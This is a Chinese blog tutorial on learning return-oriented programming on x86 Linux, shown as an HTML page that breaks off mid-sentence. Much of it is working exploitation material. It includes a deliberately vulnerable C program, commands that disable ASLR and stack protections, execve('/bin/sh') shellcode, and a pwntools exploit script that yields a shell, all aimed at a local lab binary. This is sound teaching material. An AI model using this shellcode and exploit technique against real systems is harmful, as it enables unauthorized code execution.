<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x00 序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。虽然现在大家都在用64位的操作系统，但是想要扎实的学好ROP还是得从基础的x86系统开始。 缓冲区溢出简介： 1234567891011121314Stackframe+-----------------">
<meta name="keywords" content="ROP">
<meta property="og:type" content="article">
<meta property="og:title" content="一步一步学 ROP 笔记 - x86 篇">
<meta property="og:url" content="http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/index.html">
<meta property="og:site_name" content="Yuewei.Liang">
<meta property="og:description" content="0x00 序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。虽然现在大家都在用64位的操作系统，但是想要扎实的学好ROP还是得从基础的x86系统开始。 缓冲区溢出简介： 1234567891011121314Stackframe+-----------------">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://liangyuewei.com/images/ROP/Linux%20内存随机化分布图.png">
<meta property="og:updated_time" content="2019-11-16T14:57:32.316Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="一步一步学 ROP 笔记 - x86 篇">
<meta name="twitter:description" content="0x00 序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。虽然现在大家都在用64位的操作系统，但是想要扎实的学好ROP还是得从基础的x86系统开始。 缓冲区溢出简介： 1234567891011121314Stackframe+-----------------">
<meta name="twitter:image" content="http://liangyuewei.com/images/ROP/Linux%20内存随机化分布图.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>一步一步学 ROP 笔记 - x86 篇</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/11/16/一步一步学 ROP 笔记x64篇/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/11/16/GetGo Download Manager 栈溢出/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&text=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&is_video=false&description=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=一步一步学 ROP 笔记 - x86 篇&body=Check out this article: http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&name=一步一步学 ROP 笔记 - x86 篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-level1-Control-Flow-Hijack-程序流劫持"><span class="toc-number">2.</span> <span class="toc-text">0x01 level1(Control Flow Hijack 程序流劫持)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-level2-Bypass-DEP-通过ret2libc绕过DEP防护"><span class="toc-number">3.</span> <span class="toc-text">0x02 level2(Bypass DEP 通过ret2libc绕过DEP防护)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><span class="toc-number">4.</span> <span class="toc-text">0x03 Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Memory-Leak-amp-DynELF（在不获取目标libc-so的情况下进行ROP攻击）"><span class="toc-number">5.</span> <span class="toc-text">0x04 Memory Leak&amp;DynELF（在不获取目标libc.so的情况下进行ROP攻击）</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        一步一步学 ROP 笔记 - x86 篇
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Yuewei.Liang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-11-16T12:33:14.000Z" itemprop="datePublished">2019-11-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/ROP/">ROP</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。虽然现在大家都在用64位的操作系统，但是想要扎实的学好ROP还是得从基础的x86系统开始。</p>
<p>缓冲区溢出简介：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|   local var1     |  &lt;- 4 byte</span><br><span class="line">+------------------+</span><br><span class="line">|   local var2     |  &lt;- 8 byte</span><br><span class="line">+------------------+</span><br><span class="line">|   local var2     |</span><br><span class="line">+------------------+</span><br><span class="line">|        ebp       |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
<p>如图，这个函数有一个参数和两个局部变量。局部变量和参数会放在函数的栈帧上，而且这个栈帧的大小是编译时就确定好的。可以看出局部变量1大小是4字节，局部变量2的大小是8字节。ebp和return addr是用来保存栈帧基址和函数的返回地址的，对程序员透明。如果给局部变量2输入16个字节：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|       abcd       |  &lt;- local var1</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- local var2</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- ebp</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- return addr</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
<p>可以看到局部变量2只有8字节大小的内存空间，多余的8个字节会覆盖掉ebp和return addr。在这个函数执行完后会返回到aaaa这个地址也就是0x61616161去执行此地址的指令，如果我们把return addr换成事先部署在内存的恶意指令，然后再把return addr换成这块内存的地址，则程序就会跳转到我们布置好的恶意指令上执行。</p>
<h3 id="0x01-level1-Control-Flow-Hijack-程序流劫持"><a href="#0x01-level1-Control-Flow-Hijack-程序流劫持" class="headerlink" title="0x01 level1(Control Flow Hijack 程序流劫持)"></a>0x01 level1(Control Flow Hijack 程序流劫持)</h3><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p>
<p>下面先看一下原文章中的一个具有明显缓冲区溢出的程序代码，顺便学习一下Linux平台下文件保护机制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从源码能明显看出存在缓冲区溢出漏洞。</p>
<p>gcc编译关于各个保护开启的问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NX:  -z ececstack  /  -z noexecstack （关闭 / 开启）</span><br><span class="line">Canary:  -fno-stack-protector  /  -fstack-protector  /  -fstack-protector-all  （关闭 / 开启 / 全开启）</span><br><span class="line">PIE:  -no-pie  /  -pie （关闭 / 开启）</span><br><span class="line">RELRO: -z norelro  /  -z lazy  /  -z now （关闭 / 部分开启 / 完全开启）</span><br></pre></td></tr></table></figure>
<p>因为我使用的是Ubuntu 64位，所以编译32位程序还需要加上-m32选项，需要安装以下安装包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential module-assistant  </span><br><span class="line">apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure>
<p>所以最后的编译命令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -no-pie -o level1 level1.c</span><br></pre></td></tr></table></figure>
<p>-fno-stack-protecter和-z execstack这两个参数会分别关掉DEP和Stack Protector，再加上-no-pie参数关闭PIE程序地址随机化的保护。（这里也可以加上-O0编译选项，表示不进行任何优化）</p>
<p>ok，checksec后能看到是32位程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec level1</span><br><span class="line">[*] &apos;/home/idter/Documents/ROP/level1&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>同时我们在shell中执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>执行完后我们就关掉了整个linux系统的ASLR保护。判断主机是否开启ASLR时，使用cat /proc/sys/kernel/randomize_va_space命令，若返回为0，表示未开启。也可以使用ldd通过看加载动态库时动态库的基址来确定是否开启ASLR。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd level1</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7fd7000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e01000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7fd9000)</span><br></pre></td></tr></table></figure>
<p>再次运行ldd，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd level1</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7fd7000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e01000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7fd9000)</span><br></pre></td></tr></table></figure>
<p>两次libc的基址一样也说明了主机没有开启ASLR。<br>接下来分析目标程序，首先确定溢出点的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 200</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/idter/Documents/ROP/level1 </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">...</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41416d41 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41416d41</span><br><span class="line">1094806849 found at offset: 140</span><br></pre></td></tr></table></figure>
<p>计算出PC返回值的覆盖点为140个字节，即需要填充140个字节才能到EIP地址，我们只要构造一个”A” * 140 + ret字符串，就可以让PC执行ret地址上的代码了。</p>
<p>接下来我们需要一段shellcode，可以用msf生成，或者字节反编译一下。</p>
<p>因为objdump没有看到有system函数，且没有调用syscall类型函数，所以这里构造一个shellcode来执行execve(“/bin/sh”)，进而起shell。汇编以及需要利用的shellcode如下（汇编与shellcode之间的转换可以用asm()和disasm()：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># execve (<span class="meta-string">"/bin/sh"</span>) </span></span><br><span class="line"><span class="meta"># xor ecx, ecx</span></span><br><span class="line"><span class="meta"># mul ecx</span></span><br><span class="line"><span class="meta"># push ecx</span></span><br><span class="line"><span class="meta"># push 0x68732f2f   ;; hs<span class="comment">//</span></span></span><br><span class="line"><span class="meta"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="meta"># mov ebx, esp</span></span><br><span class="line"><span class="meta"># mov al, 11</span></span><br><span class="line"><span class="meta"># int 0x80</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line">&gt;&gt;&gt; from pwn <span class="keyword">import</span> *</span><br><span class="line">&gt;&gt;&gt;  disasm('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')</span><br><span class="line">'   0:   31 c9        xor    ecx,ecx\n   2:   f7 e1       mul    ecx\n   4:   51       push   ecx\n   5:   68 2f 2f 73 68       push   0x68732f2f\n   a:   68 2f 62 69 6e         push   0x6e69622f\n   f:   89 e3        mov    ebx,esp\n  11:   b0 0b                   mov    al,0xb\n  13:   cd 80          int    0x80'</span><br></pre></td></tr></table></figure>
<p>溢出点有了，shellcode有了，下一步就是控制PC跳转到shellcode的地址上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shellcode][“AAAAAAAAAAAAAA”….][ret]</span><br><span class="line">^------------------------------------------------|</span><br></pre></td></tr></table></figure>
<p>shellcode地址的位置有个坑点，正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当执行exp的时候会发现shellcode根本不在这个地址上，原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</p>
<p>解决办法是开启core dump这个功能，执行ulimit -c 检查是否开启core dump，若结果为0，则没有启用core dump文件的生成。临时启用的方法为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c 1024</span><br><span class="line">或</span><br><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure>
<p>前一种限制core dump的文件大小不超过1024k，后一种是不限制core dump文件的大小。可以通过ulimit -c 0来关闭core dump。</p>
<p>然后需要修改core dump文件格式，定制core的路径，名称格式，通过修改下面两个配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/kernel/core_uses_pid</span><br><span class="line">echo &apos;/corefiles/core-%e-%p-%t&apos; &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
<p>第一句配置中，/proc/sys/kernel/core_uses_pid 如果这个文件的内容被配置成1，那么即使core_pattern中没有设置%p，最后生成的core dump文件名仍会加上进程ID。</p>
<p>第二句配置中的参数说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%% 单个%字符</span><br><span class="line">%p 所dump进程的进程ID</span><br><span class="line">%u 所dump进程的实际用户ID</span><br><span class="line">%g 所dump进程的实际组ID</span><br><span class="line">%s 导致本次core dump的信号</span><br><span class="line">%t core dump的时间 (由1970年1月1日计起的秒数)</span><br><span class="line">%h 主机名</span><br><span class="line">%e 程序文件名</span><br></pre></td></tr></table></figure>
<p>回到level1中，这里使用以下命令开启core dump功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;</span><br></pre></td></tr></table></figure>
<p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">./level1</span><br><span class="line">ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">$ gdb-peda ./level1 /tmp/core.1557152485 </span><br><span class="line">Reading symbols from ./level1...(no debugging symbols found)...done.</span><br><span class="line">[New LWP 2752]</span><br><span class="line">Core was generated by `./level1&apos;.</span><br><span class="line">Program terminated with signal SIGSEGV, Segmentation fault.</span><br><span class="line">#0  0x41414141 in ?? ()</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/10s $esp-144</span><br><span class="line">0xffffcff0: &quot;ABCD&quot;, &apos;A&apos; &lt;repeats 152 times&gt;, &quot;\n\226\341&quot;, &lt;incomplete sequence \367&gt;</span><br><span class="line">0xffffd091: &quot;0\373&quot;, &lt;incomplete sequence \367&gt;</span><br><span class="line">0xffffd095: &quot;0\373&quot;, &lt;incomplete sequence \367&gt;</span><br><span class="line">0xffffd099: &quot;&quot;</span><br><span class="line">0xffffd09a: &quot;&quot;</span><br><span class="line">0xffffd09b: &quot;&quot;</span><br><span class="line">0xffffd09c: &quot;7\226\341\367\001&quot;</span><br><span class="line">0xffffd0a2: &quot;&quot;</span><br><span class="line">0xffffd0a3: &quot;&quot;</span><br><span class="line">0xffffd0a4: &quot;4\321\377\377&lt;\321\377\377&quot;</span><br></pre></td></tr></table></figure>
<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$，通过的命令esp - 144，通过gdb的命令“x/10s $esp-144”，我们可以得到buf的地址为0xffffcff0</p>
<p>现在溢出点，shellcode和返回地址都有了，可以开始写exp了。</p>
<p>最终的本地测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./level1&apos;)</span><br><span class="line">ret = 0xffffcff0</span><br><span class="line"># core dump的buf地址可能会改变，需要在一段时间后执行脚本要重新计算ret值</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shellcode = asm(&apos;&apos;&apos;</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x68732f2f  </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx, esp</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br><span class="line">&apos;&apos;&apos;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) </span><br><span class="line"></span><br><span class="line">#对ret进行编码，将地址转换成内存中的二进制存储形式</span><br><span class="line">payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload) #发送payload</span><br><span class="line">p.interactive()  #开启交互shell</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_lev1.py </span><br><span class="line">[+] Starting local process &apos;./level1&apos;: pid 2817</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>我们也可以把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
